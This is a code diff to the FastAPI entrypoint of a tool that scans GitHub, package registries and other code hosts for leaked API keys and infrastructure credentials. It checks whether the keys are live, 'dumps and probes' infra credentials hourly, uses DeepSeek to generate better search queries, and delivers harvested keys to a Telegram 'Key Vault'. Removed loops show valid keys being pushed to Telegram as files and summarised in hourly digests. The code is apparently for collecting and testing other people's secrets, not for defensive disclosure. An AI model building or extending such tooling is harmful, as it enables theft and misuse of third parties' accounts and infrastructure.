@@ -2,13 +2,19 @@
 FastAPI entrypoint.
 
 Background tasks (all concurrent, independent):
-  _scan_loop()          — code-search scanner, N parallel workers per PAT
-  trufflehog_loop()     — org/user sweep via trufflehog (if configured)
-  tg_bot.bot_loop()     — Telegram interactive Key Vault (inline keyboard)
-
-Intentionally disabled:
-  _flush_loop()         — 15-min roulette push (replaced by on-demand bot vault)
-  _hourly_alert_loop()  — hourly digest push (replaced by on-demand bot vault)
+  _scan_loop()             — code-search scanner, N parallel workers per PAT
+  trufflehog_loop()        — org/user sweep via trufflehog (if configured)
+  tg_bot.bot_loop()        — Telegram interactive Key Vault (inline keyboard)
+  _query_rotation_loop()   — combinatorial query gen every 8h
+  _themer_loop()           — DeepSeek creative themer every 8h
+  _vocab_expander_loop()   — DeepSeek vocab discovery every 24h
+  _archetype_miner_loop()  — DeepSeek archetype mining every 24h
+  _active_learner_loop()   — DeepSeek tactical query gen every 30 min
+  _auto_jackpot_loop()     — infra-creds dump+probe every hour
+  _cleanup_loop()          — daily DB hygiene
+  _revalidation_loop()     — periodic key liveness re-check
+  author_walk_loop()       — watched-author repo & gist & org-member walks
+  Per-platform scanners (events/gists/issues/npm/pypi/codeberg/gitee/etc).
 """
 
 import asyncio
@@ -22,11 +28,11 @@ from fastapi import Body, FastAPI, Header, HTTPException, Query
 from fastapi.responses import HTMLResponse
 
 import db
-from config import (SCAN_INTERVAL, HOURLY_ALERT, GITHUB_TOKENS, MAX_PAGES,
+from config import (SCAN_INTERVAL, GITHUB_TOKENS, MAX_PAGES,
                     INFRA_LOW_RISK_MAX_DAYS, DB_PATH, MIRROR_MODE)
 from validators import VALIDATORS as EXTRACTORS_AVAILABLE  # actually validators dict
 from scanner import run_cycle, _TOKEN_STATUS
-from notifier import notify_hourly_digest, notify_infra_hourly, flush_unverified_buffer
+from notifier import notify_found, notify_infra_found  # noqa: F401  (used by other modules' imports through this one)
 from trufflehog_runner import trufflehog_loop
 from gitee_scanner import gitee_loop
 from events_scanner import events_loop
@@ -125,20 +131,6 @@ async def _cleanup_loop():
                          n, INFRA_LOW_RISK_MAX_DAYS)
         except Exception as e:
             log.error("cleanup loop err: %s", e)
-
-
-async def _flush_loop():
-    """Flush buffered unverified keys to Telegram every 15 minutes."""
-    while True:
-        await asyncio.sleep(900)
-        try:
-            n = await flush_unverified_buffer()
-            if n:
-                log.info("flushed %d valid keys to Telegram as text file", n)
-            else:
-                log.debug("flush: buffer empty, nothing to send")
-        except Exception as e:
-            log.error("flush loop err: %s", e)
 
 
 async def _query_rotation_loop():
@@ -307,29 +299,6 @@ async def _vocab_expander_loop():
         except Exception as e:
             log.error("vocab_expander crashed: %s", e)
         await asyncio.sleep(24 * 3600)   # 24h
-
-
-async def _hourly_alert_loop():
-    if not HOURLY_ALERT:
-        return
-    while True:
-        await asyncio.sleep(3600)
-        try:
-            since      = (datetime.now(timezone.utc) - timedelta(hours=1)).isoformat()
-            by_prov    = db.get_keys_since(since)
-            new_valid  = db.get_valid_since(since)
-            total_new  = sum(r["cnt"] for r in by_prov)
-            total_valid = sum(r["valid_cnt"] for r in by_prov)
-            await notify_hourly_digest(by_prov, total_new, total_valid, new_valid)
-            log.info("hourly digest: %d new keys", total_new)
-
-            # Infra credentials hourly digest
-            infra_rows  = db.get_infra_since(since)
-            infra_total = sum(r["cnt"] for r in infra_rows)
-            infra_high  = sum(r.get("high_cnt", 0) for r in infra_rows)
-            await notify_infra_hourly(infra_rows, infra_total, infra_high)
-        except Exception as e:
-            log.error("hourly alert err: %s", e)
 
 
 @asynccontextmanager
